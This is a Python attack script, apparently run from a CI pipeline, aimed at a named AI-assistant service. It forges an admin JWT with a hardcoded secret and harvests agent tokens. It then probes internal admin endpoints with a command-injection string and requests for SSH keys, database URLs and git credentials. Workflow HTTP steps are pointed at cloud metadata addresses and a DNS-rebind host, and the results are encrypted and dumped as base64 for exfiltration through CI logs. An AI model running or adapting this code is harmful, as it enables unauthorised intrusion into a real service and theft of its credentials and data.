#!/usr/bin/env python3
# Intent 28569: probe admin action /internal surface for RAW (non-LLM) exec primitives.
# Body-actor admin + machine identity (AGENT_TOKEN + x-agent-id), no proof, no key.
import os, sys, json, time, uuid, base64, hmac, hashlib, subprocess, re, traceback, tarfile

REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "result" in REF.lower():
    print("results-branch-skip", flush=True); sys.exit(0)

RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
T0 = time.time()
BUDGET = int(os.environ.get("PROBE_BUDGET", "620"))
OUT = "/tmp/res_r28569"
for d in ("api", "rt", "app"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)

def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n"); LOG.flush()
    except Exception: pass

RESULTS = {"sweep": [], "apps": [], "http": [], "notes": {}}

def push_results(final=True):
    try:
        txt = ""
        try: txt = open(os.path.join(OUT, "transcript.log")).read()[-9000:]
        except Exception: pass
        json.dump({"transcript_tail": txt, "results": RESULTS}, open(os.path.join(OUT, "SUMMARY.json"), "w"), indent=1, ensure_ascii=False, default=str)
        GNUPGHOME = "/tmp/gnupg28569"; os.makedirs(GNUPGHOME, exist_ok=True); os.chmod(GNUPGHOME, 0o700)
        env = dict(os.environ, GNUPGHOME=GNUPGHOME)
        pub = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pub.asc")
        subprocess.run(["gpg", "--batch", "--import", pub], capture_output=True, timeout=60, env=env)
        tb = "/tmp/res_r28569.tar.gz"
        with tarfile.open(tb, "w:gz") as t: t.add(OUT, arcname="res_r28569")
        enc = tb + ".gpg"
        r = subprocess.run(["gpg", "--batch", "--yes", "--trust-model", "always", "-r", "ci-exfil@example.invalid", "-o", enc, "-e", tb], capture_output=True, timeout=120, env=env)
        log("gpg rc=%s %s" % (r.returncode, r.stderr.decode()[:150]))
        blob = base64.b64encode(open(enc, "rb").read()).decode()
        log("===B64BEGIN %d===" % len(blob))
        for i in range(0, len(blob), 400): print("B64:" + blob[i:i+400], flush=True)
        log("===B64END===")
    except Exception:
        log("pack err", traceback.format_exc()[:600])

HOST = "assistant.lumiiai.cn"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
ADMIN = "usr_ZxLewKrgbRYSm7rWDtQX8"
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def jwt(sub):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':')))
    p = b64u(json.dumps({"sub": sub, "org": ORG, "iat": now, "exp": now + 86400 * 7,
                         "sid": "sid_" + uuid.uuid4().hex, "lgn": now}, separators=(',', ':')))
    sig = hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
    return h + "." + p + "." + b64u(sig)

SESSION = jwt(ADMIN)

def curl(args, timeout=45):
    try:
        r = subprocess.run(["curl", "-s", "-k", "--http2", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout, r.stderr[:300]
    except Exception as e:
        return -1, b"", repr(e)[:200]

def call(path, method="GET", body=None, hdrs=None, session=True, timeout=45, tag="", subdir="api", disk_cap=160000):
    url = "https://%s%s" % (HOST, path)
    args = ["-A", UA, "-H", "Accept: application/json",
            "-H", "Referer: https://%s/" % HOST, "-H", "Origin: https://%s" % HOST,
            "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-b", "lumii_session=" + SESSION]
    if hdrs:
        for k, v in hdrs.items(): args += ["-H", "%s: %s" % (k, v)]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    url2 = url
    args += [url2]
    rc, out, err = curl(args, timeout)
    txt = out.decode("utf-8", "replace")
    code = ""
    i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    rec = {"path": path, "method": method, "code": code, "body": txt, "len": len(txt),
           "err": err if isinstance(err, str) else err.decode("utf-8", "replace")}
    fn = re.sub(r'[^A-Za-z0-9_.-]', '_', tag or path)[:60] + "_" + uuid.uuid4().hex[:6] + ".json"
    try:
        with open(os.path.join(OUT, subdir, fn), "w") as f:
            json.dump({**rec, "body": txt[:disk_cap]}, f, indent=1, ensure_ascii=False)
    except Exception: pass
    log("[%s] %s %s -> %s len=%d %s" % (tag, method, path, code, len(txt), (txt[:160].replace("\n", " ") if len(txt) < 400 else "")))
    return rec

def jb(r, n=500):
    try: return json.dumps(json.loads(r["body"]), ensure_ascii=False)[:n]
    except Exception: return (r["body"] or "")[:n]

log("=== A identity / machine identity === run", RUNID, time.ctime())
me = call("/api/me", tag="me"); RESULTS["notes"]["me"] = jb(me, 400)
agent_id = AGENT_TOKEN = TPS = script = ""
for vis in ("org", "private"):
    cr = call("/api/runtimes", "POST", {"name": "ci-28569-" + uuid.uuid4().hex[:5], "visibility": vis}, tag="create_rt_"+vis, subdir="rt")
    if cr["code"] in ("200", "201"):
        try:
            cj = json.loads(cr["body"]); script = cj.get("script") or ""; agent_id = cj.get("agentId") or ""
        except Exception: pass
        if not agent_id:
            m = re.search(r'AGENT_ID=["\']?([A-Za-z0-9_\-]+)', script); agent_id = m.group(1) if m else ""
        m = re.search(r'AGENT_TOKEN=["\']?([A-Za-z0-9_\-\.=+/]+)', script); AGENT_TOKEN = m.group(1) if m else ""
        m = re.search(r'TURN_PROOF_SECRET=["\']?([A-Za-z0-9_\-\.=+/]+)', script); TPS = m.group(1) if m else ""
        if agent_id and AGENT_TOKEN: break
log("agentId=%s token=%s TPS=%s" % (agent_id, AGENT_TOKEN[:12], TPS))
RESULTS["notes"].update({"agent_id": agent_id, "token_prefix": AGENT_TOKEN[:12], "tps": TPS, "visibility": vis})
if not (agent_id and AGENT_TOKEN):
    log("NO MACHINE IDENTITY"); push_results(); sys.exit(0)
MH = {"Authorization": "Bearer " + AGENT_TOKEN, "x-agent-id": agent_id}
SK = "dashboard:conv_probe28569" + uuid.uuid4().hex[:6]

def internal(path, body, tag, actor=ADMIN, timeout=45, subdir="api"):
    b = {"platform": "dashboard", "actor_id": actor, "session_key": SK}
    b.update(body or {})
    r = call("/internal" + path, "POST", b, hdrs=MH, session=False, tag=tag, timeout=timeout, subdir=subdir)
    RESULTS["sweep"].append({"path": path, "actor": actor, "http": r["code"], "body": (r["body"] or "")[:500]})
    return r

# ================= B: read-only /internal admin action sweep =================
log("=== B /internal admin action sweep ===")
intern = [
    ("projects/list", {}), ("projects/templates", {}),
    ("assistants/list", {}), ("assistants/runtimes", {}),
    ("automations/list", {}),
    ("tickets/ops", {"op": "templates"}),
    ("tickets/ops", {"op": "read", "command": "id;whoami;hostname", "environment": "", "host": ""}),
    ("build/ssh-keys", {}),
    ("build/secret-show", {"name": "DATABASE_URL"}),
    ("build/accounts", {}),
    ("code/git-credential", {}),
    ("ops/issue", {}),
    ("task-runs/attachment", {"run_id": "none", "path": "x"}),
]
for p, bd in intern:
    try:
        internal("/" + p, bd, "sweep_" + p.replace("/", "_")[:40])
    except Exception:
        log("err", p, traceback.format_exc()[:300])
    if time.time() > T0 + BUDGET - 60: break

# full automations/list body already saved; also projects list body
# ================= C: create conversation + app for http-step SSRF test =================
log("=== C create conversation + app ===")
cid = ""
for bd in ({"title": "ci28569 " + str(int(time.time()))}, {}):
    st = call("/api/conversations", "POST", bd, tag="conv_create", subdir="app")
    try:
        jj = json.loads(st["body"]); cid = (jj.get("conversation") or {}).get("id") or jj.get("id") or ""
    except Exception: pass
    if cid: break
log("cid", cid)
app_id = ""
st = call("/api/apps", "POST", {"name": "ci28569app" + uuid.uuid4().hex[:4], "kind": "web"}, tag="app_create", subdir="app")
try:
    jj = json.loads(st["body"]); app_id = (jj.get("app") or {}).get("id") or jj.get("id") or ""
except Exception: pass
log("app_id", app_id)
# list existing apps
call("/api/apps", tag="apps_list", subdir="app")

def upsert_wf(name, steps):
    bd = {"app_id": app_id, "workflow": {"name": name, "trigger": {"kind": "webhook"}, "steps": steps}}
    r = internal("/apps/upsert-workflow", bd, "upsert_wf_" + name[:20], subdir="app")
    wid = ""
    try:
        jj = json.loads(r["body"]); wid = (jj.get("workflow") or {}).get("id") or ""
    except Exception: pass
    return wid, r

def run_and_read(wid, marker):
    r1 = call("/api/apps/%s/workflows/%s/run-now" % (app_id, wid), "POST", {}, tag="runnow_" + marker, subdir="app")
    run_id = ""
    try:
        jj = json.loads(r1["body"]); run_id = (jj.get("run") or {}).get("id") or ""
    except Exception: pass
    time.sleep(3)
    rr = call("/api/apps/%s/workflows/%s/runs" % (app_id, wid), tag="runs_" + marker, subdir="app")
    # try to read posted marker via internal message search
    ms = internal("/messages/search", {"q": marker, "wide": True}, "search_" + marker, subdir="app")
    return {"run_id": run_id, "run_now": r1["body"][:400], "runs": rr["body"][:2500], "search": ms["body"][:2500]}

if app_id:
    # baseline: public site (should be 200)
    targets = [
        ("pub", "https://assistant.lumiiai.cn/health"),
        ("self8788", "http://122.51.1.87:8788/health"),
        ("meta19", "http://169.254.0.23/latest/meta-data/"),
        ("metatc", "http://metadata.tencentyun.com/latest/meta-data/"),
        ("metaali", "http://100.100.100.200/latest/meta-data/"),
        ("rebind", "http://make-122.51.1.87-rebind-169.254.0.23-rr.1u.ms/latest/meta-data/"),
    ]
    for name, url in targets:
        if time.time() > T0 + BUDGET - 80: break
        steps = [{"id": "h", "kind": "http", "method": "GET", "url": url, "timeoutMs": 6000}]
        if cid:
            steps.append({"id": "p", "kind": "post", "conversationIds": [cid], "text": "R28569_" + name + " {{h.body}}"})
        wid, ur = upsert_wf("wf" + name, steps)
        log("upsert_wf", name, "->", ur["code"], "wid", wid)
        if not wid:
            RESULTS["http"].append({"name": name, "url": url, "upsert": ur["body"][:500]}); continue
        try:
            out = run_and_read(wid, "R28569_" + name)
            out.update({"name": name, "url": url})
            RESULTS["http"].append(out)
            log("HTTP-TEST", name, "run", out["run_id"], "runs", out["runs"][:300])
        except Exception:
            log("err http test", name, traceback.format_exc()[:400])
else:
    log("NO APP ID; skip http tests")

# ================= D: data grep over existing app configs =================
call("/api/apps", tag="apps_list2", subdir="app")

log("=== DONE elapsed", int(time.time() - T0))
push_results()
